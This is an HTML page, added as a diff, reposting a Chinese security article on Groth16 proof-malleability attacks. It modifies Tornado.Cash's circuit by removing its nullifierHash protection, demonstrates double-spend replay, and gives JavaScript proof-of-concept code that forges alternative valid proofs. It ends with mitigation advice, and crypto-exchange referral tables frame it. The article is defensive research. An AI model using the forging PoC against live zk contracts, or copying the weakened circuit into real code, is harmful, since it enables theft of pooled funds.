@@ -1,0 +1,1258 @@
+<!DOCTYPE html>
+<html
+  lang="zh-cn"
+  itemscope
+  itemtype="http://schema.org/WebPage"
+>
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>
+          深入探究 Tornado.Cash 揭示zkp项目的延展性攻击 - 区块大全
+        </title>
+    
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=yes"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="佚名" /><meta name="description" content="本文中我们将以Tornado.Cash项目为例，魔改其部分电路和代码，介绍延展性攻击流程以及该项目中对应的防范措施，希望其他zkp项目方也引起注意。" />
+<meta name="keywords" content="Tornado.cash, ZKP" />
+
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.120.4" />
+
+
+<link rel="canonical" href="/post/56552/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.d8d87b982993a745e5e7b6a6cbf257be8c3e82aab5e485f0908ad7e6c3501ab2.css" integrity="sha256-2Nh7mCmTp0Xl57amy/JXvow&#43;gqq15IXwkIrX5sNQGrI=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+
+
+<meta property="og:title" content="深入探究 Tornado.Cash 揭示zkp项目的延展性攻击" />
+<meta property="og:description" content="本文中我们将以Tornado.Cash项目为例，魔改其部分电路和代码，介绍延展性攻击流程以及该项目中对应的防范措施，希望其他zkp项目方也引起注意。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/56552/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-08-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-08-07T00:00:00+00:00" />
+
+<meta itemprop="name" content="深入探究 Tornado.Cash 揭示zkp项目的延展性攻击">
+<meta itemprop="description" content="本文中我们将以Tornado.Cash项目为例，魔改其部分电路和代码，介绍延展性攻击流程以及该项目中对应的防范措施，希望其他zkp项目方也引起注意。"><meta itemprop="datePublished" content="2023-08-07T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2023-08-07T00:00:00+00:00" />
+<meta itemprop="wordCount" content="5169">
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="深入探究 Tornado.Cash 揭示zkp项目的延展性攻击"/>
+<meta name="twitter:description" content="本文中我们将以Tornado.Cash项目为例，魔改其部分电路和代码，介绍延展性攻击流程以及该项目中对应的防范措施，希望其他zkp项目方也引起注意。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+  </head>
+  <body>
+    <div id="back-to-top"></div>
+
+    <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">区块大全</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/categories/">分类</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+    
+      
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+    
+
+    
+
+    
+
+
+    <header id="header" class="header">
+      <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      区块大全
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+    </header>
+
+    <div id="mobile-panel">
+      <main id="main" class="main bg-llight wallpaper">
+        <div class="content-wrapper">
+    <div id="content" class="content">
+      <article class="post">
+        
+        <header class="post-header">
+          <h1 class="post-title">深入探究 Tornado.Cash 揭示zkp项目的延展性攻击</h1>
+          
+
+          <div class="post-meta">
+  <div class="post-meta-author">
+    by
+      佚名
+    
+  </div>
+
+  <div class="post-meta-time">
+    <time datetime="2023-08-07">
+      2023-08-07
+    </time>
+  </div>
+
+  
+
+
+  <div class="post-meta__right">
+    <span class="post-meta-more">
+        约 5169 字 -
+        预计阅读 11 分钟
+      </span>
+
+    <div class="post-meta-category">
+        <a href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"> 区块链 </a>
+          
+      </div>
+
+
+    
+    
+
+
+    
+    
+  </div>
+</div>
+
+        </header>
+
+        
+        <div class="post-content">
+          <table>
+    <thead>
+        <tr>
+            <th style="text-align:left">推荐平台</th>
+            <th style="text-align:left">链接</th>
+            <th style="text-align:left">平台介绍</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">币安网</span></td>
+            <td style="text-align:left"><span style="white-space:nowrap"><a
+                        href="https://www.okbtc.cn/binance?ref=githubio">注册链接</a></span></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/binance?ref=githubio">币安是全球领先的区块链生态系统，推出了一系列产品，其中包括最大的加密货币交易平台。我们的使命是在未来成为全球性加密货币基础架构供应商。</a>
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">欧易OKX</span></td>
+            <td style="text-align:left"><a href="https://www.okbtc.cn/okx?ref=githubio">注册链接</a></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/okx?ref=githubio">欧易是全球著名的数字资产交易平台之一，主要面向全球用户提供比特币、莱特币、以太币等数字资产的币币和衍生品交易服务。</a>
+            </td>
+        </tr>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">HTX火币</span></td>
+            <td style="text-align:left"><a href="https://www.okbtc.cn/htx?ref=githubio">注册链接</a></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/htx?ref=githubio">火币全球专业站，是火币集团旗下服务于全球专业交易用户的创新数字资产国际站，致力于发现优质的创新数字资产投资机会。</a>
+            </td>
+        </tr>
+    </tbody>
+</table>
+<p>在上篇文章里，我们从原理的角度阐述了 Groth16 证明系统本身存在的延展性漏洞，本文中我们将以Tornado.Cash项目为例，魔改其部分电路和代码，介绍延展性攻击流程以及该项目中对应的防范措施，希望其他zkp项目方也引起注意。</p>
+<p>其中，Tornado.Cash使用snarkjs库进行开发，同样基于如下开发流程，后续就直接进行介绍，不熟悉该库的请阅读本系列第一篇文章。（<a href="https://www.jinse.cn/blockchain/3516422.html">Beosin | 深度剖析零知识证明zk-SNARK漏洞：为什么零知识证明系统并非万无一失？</a>）</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_kua4qqhzpb.png" alt="346a815b39293aee95668fb9b2049873" title="7076908"></p>
+<p>（图源：https://docs.circom.io/）</p>
+<h2 id="1-tornadocash-架构"><strong>1 Tornado.Cash 架构</strong></h2>
+<p>Tornado.Cash的交互流程中主要包含4个实体：</p>
+<ul>
+<li>
+<p>User：使用该DApp进行混币器隐私交易，包括存、取款。</p>
+</li>
+<li>
+<p>Web page：DApp的前端网页，网页上包含一些用户按钮。</p>
+</li>
+<li>
+<p>Relayer：为防止链上节点记录发起隐私交易的ip地址等信息，该服务器会代替用户重放交易，进一步增强隐私性。</p>
+</li>
+<li>
+<p>Contract：包含一个代理合约Tornado.Cash Proxy，该代理合约会根据用户存取款的金额选择指定的Tornado池子进行后续的存取款操作。目前已存在4个池子，金额分别为：0.1、1、10、100。</p>
+</li>
+</ul>
+<p>User首先在Tornado.Cash的前端网页上进行对应操作，触发存款或取款交易，接着由Relayer将其交易请求转发到链上的Tornado.Cash Proxy合约，并根据交易金额转发到对应的Pool中，最终进行存款和取款等处理，具体的架构如下：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_m8jjasricw.png" alt="f471dfca152796f84a6389ff3a6d96ac" title="7076909"></p>
+<p>Tornado.Cash作为一个混币器，其具体业务功能分为两部分：</p>
+<ul>
+<li>deposit：当用户进行存款交易时，首先在前端网页上选择存入的代币(BNB、ETH等)和对应的数额，为了更好的确保用户的隐私性，只能存入四种金额数量；</li>
+</ul>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_0fow5p7eun.png" alt="fc9fe4cf9b1b8528e2446d23f39afc9a" title="7076910"></p>
+<p>图源：<a href="https://ipfs.io/ipns/tornadocash.eth/">https://ipfs.io/ipns/tornadocash.eth/</a></p>
+<p>接着服务器会生成两个31字节的随机数nullifier、secret，将其拼接后进行pedersenHash运算即可得到commitment，将nullifier+secret加上前缀作为note返回给用户，note如下图：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_d7r1qu1umb.png" alt="83feeca678c53c26a5cfe70f55d29f10" title="7076911"></p>
+<ul>
+<li>
+<p>随后发起一笔deposit交易将commitment等数据发送到链上Tornado.Cash Proxy合约中，代理合约根据deposit的金额将数据转发至对应的Pool中，最后Pool合约将commitment作为叶子结点插入到merkle tree，并将计算出的root存储在Pool合约中。</p>
+</li>
+<li>
+<p>withdraw：当用户进行取款交易时，首先在前端网页上输入deposit时返回的note数据和收款地址；</p>
+</li>
+</ul>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_5rl233990d.png" alt="49898b341e39bdbebd651b5d3918faef" title="7076912"></p>
+<p>图源：<a href="https://ipfs.io/ipns/tornadocash.eth/">https://ipfs.io/ipns/tornadocash.eth/</a></p>
+<ul>
+<li>接着服务器会在链下检索出所有Tornadocash的deposit事件，提取其中的commitment构建链下的Merkle tree，并根据用户给出的note数据(nullifier+secret)生成commitment并生成对应的Merkle Path和对应的root，并作为电路输入得到零知识SNARK proof；最后，再发起一笔withdraw交易到链上的Tornado.Cash Proxy合约中，接着根据参数跳转到对应的Pool合约中验证证明，将钱打入用户指定的接收者地址。</li>
+</ul>
+<p>其中，Tornado.Cash 的withdraw核心其实就是在不暴露用户持有的nullifier、secret的情况下，证明某个commitment存在于Merkle tree上，具体的默克尔树结构如下：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_k8wf8u6lmn.png" alt="a56d827c9d275989d6948e23280123ce" title="7076913"></p>
+<h2 id="2-tornadocash-魔改漏洞版"><strong>2 Tornado.Cash 魔改漏洞版</strong></h2>
+<h2 id="21-tornadocash-魔改"><strong>2.1 Tornado.Cash 魔改</strong></h2>
+<p>针对第一篇文章Groth16 延展性攻击原理，<strong>我们知道攻击者使用相同的nullifier、secret其实可以生成多个不同的Proof，那么如果开发者没有考虑到Proof重放造成的双花攻击，就会威胁到项目资金。</strong> 在对Tornado.Cash进行魔改之前，本文先介绍一下Tornado.Cash最终处理withdraw的Pool中代码：</p>
+<pre><code> `/**`
+
+ 
+ 
+    ``@dev Withdraw a deposit from the contract. `proof` is a zkSNARK proof data, and input is an array of circuit public inputs``
+
+ 
+ 
+    `` `input` array consists of: ``
+
+ 
+ 
+      `- merkle root of all deposits in the contract`
+
+ 
+ 
+      `- hash of unique deposit nullifier to prevent double spends`
+
+ 
+ 
+      `- the recipient of funds`
+
+ 
+ 
+      `- optional fee that goes to the transaction sender (usually a relay)`
+
+ 
+ 
+  `*/`
+
+ 
+ 
+  `function withdraw(`
+
+ 
+ 
+    `bytes calldata _proof,`
+
+ 
+ 
+    `bytes32 _root,`
+
+ 
+ 
+    `bytes32 _nullifierHash,`
+
+ 
+ 
+    `address payable _recipient,`
+
+ 
+ 
+    `address payable _relayer,`
+
+ 
+ 
+    `uint256 _fee,`
+
+ 
+ 
+    `uint256 _refund`
+
+ 
+ 
+  `) external payable nonReentrant {`
+
+ 
+ 
+    `require(_fee &lt;= denomination, &quot;Fee exceeds transfer value&quot;);`
+
+ 
+ 
+    `require(!nullifierHashes[_nullifierHash], &quot;The note has been already spent&quot;);`
+
+ 
+ 
+    `require(isKnownRoot(_root), &quot;Cannot find your merkle root&quot;); // Make sure to use a recent one`
+
+ 
+ 
+    `require(`
+
+ 
+ 
+      `verifier.verifyProof(`
+
+ 
+ 
+        `_proof,`
+
+ 
+ 
+        `[uint256(_root), uint256(_nullifierHash), uint256(_recipient), uint256(_relayer), _fee, _refund]`
+
+ 
+ 
+      `),`
+
+ 
+ 
+      `&quot;Invalid withdraw proof&quot;`
+
+ 
+ 
+    `);`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `nullifierHashes[_nullifierHash] = true;`
+
+ 
+ 
+    `_processWithdraw(_recipient, _relayer, _fee, _refund);`
+
+ 
+ 
+    `emit Withdrawal(_recipient, _nullifierHash, _relayer, _fee);`
+
+ 
+ 
+  `}`
+</code></pre>
+<p>上图中为了防止攻击者使用同一个Proof进行双花攻击，而又不暴露nullifier、secret，Tornado.Cash在电路中增加了一个公共信号nullifierHash，它是由nullifier进行Pedersen哈希得到，可以作为参数传到链上，Pool合约再使用该变量标识一个正确的Proof是否已经被使用过。但是如果项目方不采用修改电路的方式，而是直接以记录Proof方式来防止双花，毕竟这样做可以减少电路约束，从而节省开销，但是能否达到目的呢？</p>
+<p>对于此猜想，本文将删除电路中新增的nullifierHash公共信号，并将合约校验改为Proof校验。由于Tornado.Cash在每次withdraw时都会获取所有的deposit事件组建merkle tree再校验生成的root值是否在最近生成的30个之内，整个过程太过麻烦，因此本文电路也将删除merkleTree电路，仅仅留下withdraw部分的核心电路，具体电路如下：</p>
+<pre><code> `include &quot;../../../../node_modules/circomlib/circuits/bitify.circom&quot;;`  
+
+ 
+ 
+ `include &quot;../../../../node_modules/circomlib/circuits/pedersen.circom&quot;;`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `// computes Pedersen(nullifier + secret)`
+
+ 
+ 
+ `template CommitmentHasher() {`
+
+ 
+ 
+    `signal input nullifier;`
+
+ 
+ 
+    `signal input secret;`
+
+ 
+ 
+    `signal output commitment;`
+
+ 
+ 
+    `// signal output nullifierHash;   // delete`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `component commitmentHasher = Pedersen(496);`
+
+ 
+ 
+    `// component nullifierHasher = Pedersen(248);`
+
+ 
+ 
+    `component nullifierBits = Num2Bits(248);`
+
+ 
+ 
+    `component secretBits = Num2Bits(248);`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `nullifierBits.in &lt;== nullifier;`
+
+ 
+ 
+    `secretBits.in &lt;== secret;`
+
+ 
+ 
+    `for (var i = 0; i &lt; 248; i++) {`
+
+ 
+ 
+        `// nullifierHasher.in[i] &lt;== nullifierBits.out[i];  // delete`
+
+ 
+ 
+        `commitmentHasher.in[i] &lt;== nullifierBits.out[i];`
+
+ 
+ 
+        `commitmentHasher.in[i + 248] &lt;== secretBits.out[i];`
+
+ 
+ 
+    `}`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `commitment &lt;== commitmentHasher.out[0];`
+
+ 
+ 
+    `// nullifierHash &lt;== nullifierHasher.out[0];   // delete`
+
+ 
+ 
+ `}`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `// Verifies that commitment that corresponds to given secret and nullifier is included in the merkle tree of deposits`
+
+ 
+ 
+    `signal output commitment;`
+
+ 
+ 
+    `signal input recipient; // not taking part in any computations`
+
+ 
+ 
+    `signal input relayer;  // not taking part in any computations`
+
+ 
+ 
+    `signal input fee;      // not taking part in any computations`
+
+ 
+ 
+    `signal input refund;   // not taking part in any computations`
+
+ 
+ 
+    `signal input nullifier;`
+
+ 
+ 
+    `signal input secret;`
+
+ 
+ 
+    `component hasher = CommitmentHasher();`
+
+ 
+ 
+    `hasher.nullifier &lt;== nullifier;`
+
+ 
+ 
+    `hasher.secret &lt;== secret;`
+
+ 
+ 
+    `commitment &lt;== hasher.commitment;`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `// Add hidden signals to make sure that tampering with recipient or fee will invalidate the snark proof`
+
+ 
+ 
+    `// Most likely it is not required, but it's better to stay on the safe side and it only takes 2 constraints`
+
+ 
+ 
+    `// Squares are used to prevent optimizer from removing those constraints`
+
+ 
+ 
+    `signal recipientSquare;`
+
+ 
+ 
+    `signal feeSquare;`
+
+ 
+ 
+    `signal relayerSquare;`
+
+ 
+ 
+    `signal refundSquare;`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `recipientSquare &lt;== recipient * recipient;`
+
+ 
+ 
+    `feeSquare &lt;== fee * fee;`
+
+ 
+ 
+    `relayerSquare &lt;== relayer * relayer;`
+
+ 
+ 
+    `refundSquare &lt;== refund * refund;`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `}`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `component main = Withdraw(20);`
+</code></pre>
+<p><em>注意：我们在实验过程中发现，TornadoCash 在 GitHub 中的最新版代码里</em>_（https://github.com/tornadocash/tornado-core）， withdraw 电路缺乏输出信号，需要人工修正才能正确运行。_</p>
+<p>根据上述修改后的电路，使用snarkjs库等按照本文开始给出的开发流程逐步进行，生成如下正常Proof，记为proof1：</p>
+<p>The proof: {  pi_a: [    12731245758885665844440940942625335911548255472545721927606279036884288780352n,    11029567045033340566548367893304052946457319632960669053932271922876268005970n,    1n  ],  pi_b: [    [      4424670283556465622197187546754094667837383166479615474515182183878046002081n,      8088104569927474555610665242983621221932062943927262293572649061565902268616n    ],    [      9194248463115986940359811988096155965376840166464829609545491502209803154186n,      18373139073981696655136870665800393986130876498128887091087060068369811557306n    ],    [ 1n, 0n ]  ],  pi_c: [    1626407734863381433630916916203225704171957179582436403191883565668143772631n,    10375204902125491773178253544576299821079735144068419595539416984653646546215n,    1n  ],  protocol: &lsquo;groth16&rsquo;,  curve: &lsquo;bn128&rsquo;}</p>
+<p><strong>2.2 实验验证</strong></p>
+<hr>
+<h2 id="221-验证证明--circom-生成的默认合约"><strong>2.2.1 验证证明 — circom 生成的默认合约</strong></h2>
+<p>首先，我们使用circom 生成的默认合约进行验证，该合约由于根本没有记录任何已经使用过的Proof相关信息，攻击者可多次重放proof1造成双花攻击。在下列实验中，可以针对同一电路的同一个input，无限次重放proof，均能通过验证。</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_83h51nzl5f.png" alt="caaf8474774d0ffaaea894961231e604" title="7076914"></p>
+<p>下图是使用proof1在默认合约中证明验证通过的实验截图，包含上篇文章中使用的Proof参数A、B、C，以及最终的结果：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_q7569rhyp9.png" alt="8796de83786dab2e1d2fe8988a2a8c3c" title="7076915"></p>
+<p>下图是我们使用同样的proof1多次调用verifyProof函数进行证明验证的结果，实验发现针对同一input，无论攻击者使用多少次proof1进行验证，都可以通过：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_h1cvhlwgwu.png" alt="058bfa45cfac5803990db4cb707c737b" title="7076916"></p>
+<p>当然在我们在snarkjs原生的js代码库中进行测试，也并未对已经使用过的Proof进行防范，实验结果如下：</p>
+<h2 id="222-验证证明--普通防重放合约"><strong>2.2.2 验证证明 — 普通防重放合约</strong></h2>
+<p>针对circom 生成的默认合约中的重放漏洞，本文记录已使用过的正确Proof(proof1)中的一个值，以达到防止使用验证过的proof进行重放攻击的目的，具体如下图所示：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_cptil0l2km.png" alt="9afeb481747b16752a00b70c5562bac2" title="7076917"></p>
+<p>继续使用proof1进行验证，实验发现在使用同样Proof进行二次验证时，交易revert报错：&ldquo;The note has been already spent&rdquo;，结果如下图所示：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_oq27cb2epm.png" alt="40293d602538a60400dffa795e0454dd" title="7076918"></p>
+<p>但是<strong>此时虽然达到了防止普通proof重放攻击的目的，但是前文介绍过groth16算法存在延展性漏洞问题，这种防范措施仍可以被绕过。于是下图我们构造PoC，按照第一篇文章中的算法针对同一input生成伪造的zk-SNARK证明，实验发现仍然能通过验证。生成伪造证明proof2的PoC代码如下：</strong></p>
+<pre><code> `import WasmCurve from &quot;/Users/saya/node_modules/ffjavascript/src/wasm_curve.js&quot;`
+
+ 
+ 
+ `import ZqField from &quot;/Users/saya/node_modules/ffjavascript/src/f1field.js&quot;`
+
+ 
+ 
+ `import groth16FullProve from &quot;/Users/saya/node_modules/snarkjs/src/groth16_fullprove.js&quot;`
+
+ 
+ 
+ `import groth16Verify from &quot;/Users/saya/node_modules/snarkjs/src/groth16_verify.js&quot;;`
+
+ 
+ 
+ `import * as curves from &quot;/Users/saya/node_modules/snarkjs/src/curves.js&quot;;`
+
+ 
+ 
+ `import fs from &quot;fs&quot;;`
+
+ 
+ 
+ `import {  utils }   from &quot;ffjavascript&quot;;`
+
+ 
+ 
+ `const {unstringifyBigInts} = utils;`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `groth16_exp();`
+
+ 
+ 
+ `async function groth16_exp(){`
+
+ 
+ 
+    `let inputA = &quot;7&quot;;`
+
+ 
+ 
+    `let inputB = &quot;11&quot;;`
+
+ 
+ 
+    `const SNARK_FIELD_SIZE = BigInt('21888242871839275222246405745257275088548364400416034343698204186575808495617');`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `// 2. 读取string后转化为int`
+
+ 
+ 
+    `const proof = await unstringifyBigInts(JSON.parse(fs.readFileSync(&quot;proof.json&quot;,&quot;utf8&quot;)));`
+
+ 
+ 
+    `console.log(&quot;The proof:&quot;,proof);`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `// 生成逆元，生成的逆元必须在F1域`
+
+ 
+ 
+    `const F = new ZqField(SNARK_FIELD_SIZE);`
+
+ 
+ 
+    `// const F = new F2Field(SNARK_FIELD_SIZE);`
+
+ 
+ 
+    `const X = F.e(&quot;123456&quot;)`
+
+ 
+ 
+    `const invX = F.inv(X)`
+
+ 
+ 
+    `console.log(&quot;x:&quot; ,X )`
+
+ 
+ 
+    `console.log(&quot;invX&quot; ,invX)`
+
+ 
+ 
+    `console.log(&quot;The timesScalar is:&quot;,F.mul(X,invX))`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `// 读取椭圆曲线G1、G2点` 
+
+ 
+ 
+    `const vKey = JSON.parse(fs.readFileSync(&quot;verification_key.json&quot;,&quot;utf8&quot;));`
+
+ 
+ 
+    `// console.log(&quot;The curve is:&quot;,vKey);`
+
+ 
+ 
+    `const curve = await curves.getCurveFromName(vKey.curve);`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `const G1 = curve.G1;`
+
+ 
+ 
+    `const G2 = curve.G2;`
+
+ 
+ 
+    `const A = G1.fromObject(proof.pi_a);`
+
+ 
+ 
+    `const B = G2.fromObject(proof.pi_b);`
+
+ 
+ 
+    `const C = G1.fromObject(proof.pi_c);`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `const new_pi_a = G1.timesScalar(A, X);  //A'=x*A`
+
+ 
+ 
+    `const new_pi_b = G2.timesScalar(B, invX);  //B'=x^{-1}*B`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `proof.pi_a = G1.toObject(G1.toAffine(A));`
+
+ 
+ 
+    `proof.new_pi_a = G1.toObject(G1.toAffine(new_pi_a))`
+
+ 
+ 
+    `proof.new_pi_b = G2.toObject(G2.toAffine(new_pi_b))`
+
+ 
+ 
+ `   `
+
+ 
+ 
+    `// 将生成的G1、G2点转化为proof`
+
+ 
+ 
+    `console.log(&quot;proof.pi_a:&quot;,proof.pi_a);`
+
+ 
+ 
+    `console.log(&quot;proof.new_pi_a:&quot;,proof.new_pi_a)`
+
+ 
+ 
+    `console.log(&quot;proof.new_pi_b:&quot;,proof.new_pi_b)`
+
+ 
+ 
+ `   `
+
+ 
+ 
+ `}`
+</code></pre>
+<p>生成的伪造证明proof2，具体如下图所示：</p>
+<p>再次使用该参数调用verifyProof函数进行证明验证时，实验发现同一input的情况下使用proof2验证再次通过了，具体如下所示：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_c064ej1ss1.png" alt="03d0f119ea666620685b4cece791a789" title="7076919"></p>
+<p>虽然伪造的证明proof2也只能再使用一次，但由于针对同一input的伪造的证明存在几乎无限多个，因此可能造成合约资金被无限次被提取。</p>
+<p>本文同样使用circom库的js代码进行测试，实验结果proof1和伪造的proof2都可以通过验证：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_kzbd858st5.png" alt="9153431b50b81dcadbf68930ded584c3" title="7076920"></p>
+<p><strong>2.2.3 验证证明 — Tornado.Cash放重放合约</strong></p>
+<hr>
+<p>经历了那么多次失败，难道没有一种方式可以一劳永逸吗？此处按照Tornado.Cash中通过校验原始input是否已经被使用的做法，本文继续修改合约代码如下：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_94emusb2ss.png" alt="28fabffcac9037a41e030db84f44f83b" title="7076921"></p>
+<p>需要说明的是，为了展示groth16算法延展性攻击的防范简单措施，**本文采取直接记录原始电路input的方式，但是这不符合零知识证明的隐私原则，电路输入应当是保密的。**比如 Tornado.Cash中input都是private，需要重新新增一个public input标识一条Proof。本文由于电路中没有新增标识，所以隐私性相对于Tornado.Cash来说较差，仅作为实验Demo展示结果如下：</p>
+<p><img src="https://img.bibiqing.com/news/2023/0807/16_1p24nksmg0.png" alt="ac4624fc066156979fae817e327c6224" title="7076922"></p>
+<p>可以发现，上图中使用同一input的Proof，只有第一次可以通过验证proof1，随后该proof1和伪造的proof2都不能通过校验。</p>
+<h2 id="3-总结和建议"><strong>3 总结和建议</strong></h2>
+<p>本文主要通过魔改TornadoCash的电路和使用开发者常用的Circom默认生成的合约验证了重放漏洞的真实性和危害，并进一步验证了使用在合约层面的普通措施可以防护重放漏洞，但无法防止groth16的延展性攻击，对此，我们建议零知识证明的项目在项目开发时，应注意：</p>
+<ul>
+<li>
+<p>与传统DApp使用地址等唯一数据生成节点数据的方式不同，zkp项目通常是使用组合随机数的方式生成Merkle tree节点，需要注意业务逻辑是否允许插入相同数值节点的情况。<strong>因为相同的叶子结点数据可能导致部分用户资金被锁死在合约中，或者是同一叶子节点数据存在多个Merkle Proof混淆业务逻辑的情况。</strong></p>
+</li>
+<li>
+<p>zkp项目方通常使用mapping记录已使用的过的Proof，防范双花攻击。<strong>需要注意使用Groth16开发时，由于存在延展性攻击，因此记录需使用节点原始数据，而不能仅仅使用Proof相关数据标识。</strong></p>
+</li>
+<li>
+<p>复杂电路可能存在电路不确定、欠约束等问题，合约验证时条件不完整，实现逻辑存在漏洞等问题，<strong>我们强烈建议项目方在项目上线时，寻求对电路和合约都有一定研究的安全审计公司进行全面审计，尽可能的保证项目安全。</strong></p>
+</li>
+</ul>
+<table>
+    <thead>
+        <tr>
+            <th style="text-align:left">推荐平台</th>
+            <th style="text-align:left">链接</th>
+            <th style="text-align:left">平台介绍</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td style="text-align:left"><span style="white-space:nowrap">Gate芝麻开门</span></td>
+            <td style="text-align:left"><span style="white-space:nowrap"><a
+                        href="https://www.okbtc.cn/gateio?ref=githubio">平台介绍</a></span></td>
+            <td style="text-align:left"><a
+                    href="https://www.okbtc.cn/gateio?ref=githubio">Gate.io芝麻开门创立于2013年，是全球真实交易量TOP10的加密货币交易平台，向全球数千万用户提供安全可靠、真实透明的数字资产交易服务。</a>
+            </td>
+        </tr>
